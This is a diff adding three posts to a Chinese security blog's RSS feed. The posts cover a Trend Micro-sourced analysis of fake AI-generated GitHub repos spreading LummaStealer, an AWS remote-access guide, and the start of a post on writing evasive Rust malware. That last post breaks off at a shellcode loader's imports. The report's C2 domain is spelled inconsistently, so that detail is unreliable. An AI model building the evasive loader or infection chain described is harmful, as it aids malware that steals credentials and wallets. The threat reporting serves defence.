@@ -7,7 +7,689 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Sat, 02 Aug 2025 18:42:53 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 02 Aug 2025 22:33:52 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>AI生成虚假GitHub仓库传播SmartLoader和LummaStealer恶意软件</title>
+        <link>http://localhost:1313/p/ai%E7%94%9F%E6%88%90%E8%99%9A%E5%81%87github%E4%BB%93%E5%BA%93%E4%BC%A0%E6%92%ADsmartloader%E5%92%8Clummastealer%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/</link>
+        <pubDate>Sat, 02 Aug 2025 22:33:52 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/ai%E7%94%9F%E6%88%90%E8%99%9A%E5%81%87github%E4%BB%93%E5%BA%93%E4%BC%A0%E6%92%ADsmartloader%E5%92%8Clummastealer%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/</guid>
+        <description>&lt;h2 id=&#34;技术分析&#34;&gt;技术分析
+&lt;/h2&gt;&lt;h3 id=&#34;攻击链概述&#34;&gt;攻击链概述
+&lt;/h3&gt;&lt;p&gt;趋势科技威胁狩猎团队发现新型攻击活动，攻击者创建AI生成的虚假GitHub仓库，伪装成以下类型项目：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;游戏外挂程序&lt;/li&gt;
+&lt;li&gt;软件破解工具&lt;/li&gt;
+&lt;li&gt;加密货币工具&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;lua51.dll&lt;/code&gt; - LuaJIT运行时解释器&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;luajit.exe&lt;/code&gt; - Lua加载器可执行文件&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;userdata.txt&lt;/code&gt; - 恶意Lua脚本（经混淆处理）&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Launcher.bat&lt;/code&gt; - 执行批处理脚本&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;技术演进对比&#34;&gt;技术演进对比
+&lt;/h3&gt;&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;特征&lt;/th&gt;
+          &lt;th&gt;2024年10月旧活动&lt;/th&gt;
+          &lt;th&gt;2025年新活动&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;托管方式&lt;/td&gt;
+          &lt;td&gt;GitHub文件附件&lt;/td&gt;
+          &lt;td&gt;GitHub Releases板块&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;诱导手段&lt;/td&gt;
+          &lt;td&gt;仿冒下载页面&lt;/td&gt;
+          &lt;td&gt;AI生成仓库文档&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;载荷传递&lt;/td&gt;
+          &lt;td&gt;直接下载&lt;/td&gt;
+          &lt;td&gt;多阶段Lua脚本执行链&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;载荷执行流程&#34;&gt;载荷执行流程
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;受害者执行Launcher.bat触发luajit.exe&lt;/li&gt;
+&lt;li&gt;加载器从GitHub获取加密文件（l.txt/lmd.txt）&lt;/li&gt;
+&lt;li&gt;重命名为search.exe/debug.lua后执行&lt;/li&gt;
+&lt;li&gt;通过AutoIT脚本释放LummaStealer&lt;/li&gt;
+&lt;li&gt;连接C2服务器（pasteflawwed[.]world）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;窃取数据类型&#34;&gt;窃取数据类型
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;浏览器凭证与Cookie&lt;/li&gt;
+&lt;li&gt;加密货币钱包文件&lt;/li&gt;
+&lt;li&gt;2FA扩展数据（如Authenticator）&lt;/li&gt;
+&lt;li&gt;系统敏感信息（PII）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;防御建议&#34;&gt;防御建议
+&lt;/h2&gt;&lt;h3 id=&#34;企业防护措施&#34;&gt;企业防护措施
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;1.&lt;/span&gt; 终端防护：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 部署具备行为检测的EDR解决方案
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 启用应用程序控制策略（阻止非授权脚本）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;2.&lt;/span&gt; 网络防护：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 阻断已知恶意GitHub域名
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;-&lt;/span&gt; 监控异常9222端口调试流量
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;3.&lt;/span&gt; 威胁狩猎：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   ```hunting_query
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   eventSubId:301 AND processFilePath:Research.com 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   AND hostName:pasteflawded.world
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;### 个人防护要点
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 验证仓库真实性（检查commit历史/贡献者）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 使用沙箱环境检测可疑文件
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 避免下载&amp;#34;灰色&amp;#34;软件（破解/外挂工具）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;## 威胁指标(IoC)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- C2域名：pasteflawded[.]world
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- 文件哈希：详见趋势科技官方IoC列表
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- AutoIT载荷路径：`%TEMP%\Research.com`
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; 该活动显示攻击者正将AI技术与传统代码混淆（Lua/Prometheus混淆器）相结合，滥用开发平台信誉实施供应链攻击。建议结合威胁情报进行主动防御。
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>AWS远程访问指南：混合办公环境的安全技术方案</title>
+        <link>http://localhost:1313/p/aws%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%8C%87%E5%8D%97%E6%B7%B7%E5%90%88%E5%8A%9E%E5%85%AC%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/</link>
+        <pubDate>Sat, 02 Aug 2025 22:00:53 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/aws%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%8C%87%E5%8D%97%E6%B7%B7%E5%90%88%E5%8A%9E%E5%85%AC%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/</guid>
+        <description>&lt;h1 id=&#34;aws远程访问指南混合办公环境的安全技术方案&#34;&gt;AWS远程访问指南：混合办公环境的安全技术方案
+&lt;/h1&gt;&lt;p&gt;Amazon Web Services（AWS）客户可通过安全远程访问云资源，在保障业务敏捷性的同时满足灵活办公需求。随着混合办公模式普及，AWS提供完整的安全解决方案，帮助企业在允许远程访问的前提下维护资源保护、访问控制及合规要求。&lt;/p&gt;
+&lt;h2 id=&#34;关键技术用例&#34;&gt;关键技术用例
+&lt;/h2&gt;&lt;p&gt;本文重点解决以下场景：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户访问VPC内部署的Web应用&lt;/li&gt;
+&lt;li&gt;运维人员访问VPC内的EC2/RDS实例&lt;/li&gt;
+&lt;li&gt;分析师访问Amazon S3敏感数据&lt;/li&gt;
+&lt;li&gt;用户访问SAML 2.0/OAuth 2.0应用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;远程访问核心挑战&#34;&gt;远程访问核心挑战
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;成本控制&lt;/strong&gt;：解决方案的经济性评估&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;暴露面扩大&lt;/strong&gt;：需保护身份、设备及通信链路&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;社会工程风险&lt;/strong&gt;：人为因素成为安全薄弱环节&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;用户体验&lt;/strong&gt;：不良UX设计可能引发操作风险&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;五大技术方案详解&#34;&gt;五大技术方案详解
+&lt;/h2&gt;&lt;h3 id=&#34;1-网络层方案network-based&#34;&gt;1. 网络层方案（Network-based）
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;核心服务&lt;/strong&gt;：AWS Client VPN&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;基于OpenVPN客户端实现VPC安全接入&lt;/li&gt;
+&lt;li&gt;支持企业IDP联合证书双重认证&lt;/li&gt;
+&lt;li&gt;通过CIDR授权规则实现网络级访问控制&lt;/li&gt;
+&lt;li&gt;典型架构：用户设备 → Client VPN → VPC端点 → 目标资源&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-主机层方案host-based&#34;&gt;2. 主机层方案（Host-based）
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;关键技术对比&lt;/strong&gt;：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;服务&lt;/th&gt;
+          &lt;th&gt;协议&lt;/th&gt;
+          &lt;th&gt;认证方式&lt;/th&gt;
+          &lt;th&gt;可见性&lt;/th&gt;
+          &lt;th&gt;成本模型&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Systems Manager&lt;/td&gt;
+          &lt;td&gt;SSH/RDP&lt;/td&gt;
+          &lt;td&gt;IAM策略&lt;/td&gt;
+          &lt;td&gt;CloudTrail全日志&lt;/td&gt;
+          &lt;td&gt;免费（EC2场景）&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;EC2 Instance Connect&lt;/td&gt;
+          &lt;td&gt;原生SSH&lt;/td&gt;
+          &lt;td&gt;短期密钥&lt;/td&gt;
+          &lt;td&gt;连接级审计&lt;/td&gt;
+          &lt;td&gt;无附加费用&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;3-终端用户计算euc&#34;&gt;3. 终端用户计算（EUC）
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;服务选型&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Amazon WorkSpaces&lt;/strong&gt;：持久化云桌面（WSP/PCoIP协议）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;AppStream 2.0&lt;/strong&gt;：按需应用流式传输（NICE DCV协议）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;安全优势&lt;/strong&gt;：数据永不离开VPC，仅传输加密像素流&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-应用层方案application-based&#34;&gt;4. 应用层方案（Application-based）
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;IAM Identity Center核心能力&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;统一管理SAML 2.0/OAuth 2.0应用访问&lt;/li&gt;
+&lt;li&gt;内置支持Amazon QuickSight等AWS托管应用&lt;/li&gt;
+&lt;li&gt;与企业AD/SAML IDP无缝集成&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;5-零信任模型&#34;&gt;5. 零信任模型
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;AWS Verified Access关键技术&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;基于Cedar策略的细粒度授权&lt;/li&gt;
+&lt;li&gt;集成设备信号增强决策上下文&lt;/li&gt;
+&lt;li&gt;每个请求的完整日志记录（HTTP/TCP层）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;技术选型决策矩阵&#34;&gt;技术选型决策矩阵
+&lt;/h2&gt;&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;解决方案&lt;/th&gt;
+          &lt;th&gt;信任边界&lt;/th&gt;
+          &lt;th&gt;协议支持&lt;/th&gt;
+          &lt;th&gt;授权粒度&lt;/th&gt;
+          &lt;th&gt;成本因素&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Client VPN&lt;/td&gt;
+          &lt;td&gt;网络子网&lt;/td&gt;
+          &lt;td&gt;IP层&lt;/td&gt;
+          &lt;td&gt;CIDR块级&lt;/td&gt;
+          &lt;td&gt;连接时长×终端数&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Verified Access&lt;/td&gt;
+          &lt;td&gt;应用实例&lt;/td&gt;
+          &lt;td&gt;HTTP(S)/TCP&lt;/td&gt;
+          &lt;td&gt;属性基策略&lt;/td&gt;
+          &lt;td&gt;应用数×带宽消耗&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;WorkSpaces&lt;/td&gt;
+          &lt;td&gt;虚拟桌面&lt;/td&gt;
+          &lt;td&gt;WSP&lt;/td&gt;
+          &lt;td&gt;组成员关系&lt;/td&gt;
+          &lt;td&gt;实例类型×运行时长&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;实施建议&#34;&gt;实施建议
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;资产分类&lt;/strong&gt;：明确需访问的资源关键等级&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;可见性设计&lt;/strong&gt;：确保满足合规审计要求&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;混合部署&lt;/strong&gt;：不同场景组合使用多方案（如内部员工用Session Manager，外包人员用AppStream 2.0）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;参考架构&lt;/strong&gt;：遵循&lt;a class=&#34;link&#34; href=&#34;https://docs.aws.amazon.com/prescriptive-guidance/latest/security-reference-architecture/welcome.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;AWS安全参考架构&lt;/a&gt;设计部署模型&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>Rust在恶意软件开发中的优势与实践</title>
+        <link>http://localhost:1313/p/rust%E5%9C%A8%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E5%AE%9E%E8%B7%B5/</link>
+        <pubDate>Sat, 02 Aug 2025 21:49:26 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/rust%E5%9C%A8%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E5%AE%9E%E8%B7%B5/</guid>
+        <description>&lt;h1 id=&#34;rust在恶意软件开发中的应用&#34;&gt;Rust在恶意软件开发中的应用
+&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
+&lt;/h2&gt;&lt;p&gt;作者分享了学习Rust进行恶意软件开发的经历，旨在提升模拟真实攻击的能力。Rust因其固有的反分析特性成为首选语言，能开发更具隐蔽性的工具。&lt;/p&gt;
+&lt;h2 id=&#34;rust与c语言的对比分析&#34;&gt;Rust与C语言的对比分析
+&lt;/h2&gt;&lt;p&gt;近年来，Go、Nim和Rust等语言在恶意软件作者中日益流行，主要基于两个假设：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;这些语言编译的二进制文件比C/C++更难逆向分析&lt;/li&gt;
+&lt;li&gt;非常规语言开发的恶意软件更容易绕过基于签名的检测机制&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;2023年罗切斯特理工学院的一项研究证实：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Rust二进制文件显著大于C/C++版本&lt;/li&gt;
+&lt;li&gt;自动化分析工具对Rust程序产生更多误报和漏报&lt;/li&gt;
+&lt;li&gt;Ghidra和IDA Free等工具对Rust二进制文件的反编译效果较差&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;实例分析shellcode加载器&#34;&gt;实例分析：Shellcode加载器
+&lt;/h2&gt;&lt;p&gt;通过功能相同的Rust和C版shellcode加载器进行对比：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;fs&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;File&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;ptr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windows&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;Win32&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Threading&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WaitForSingleObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;THREAD_CREATION_FLAGS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;INFINITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Memory&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualProtect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;MEM_COMMIT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;MEM_RESERVE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_READWRITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_PROTECTION_FLAGS&lt;/span&gt;&lt;span 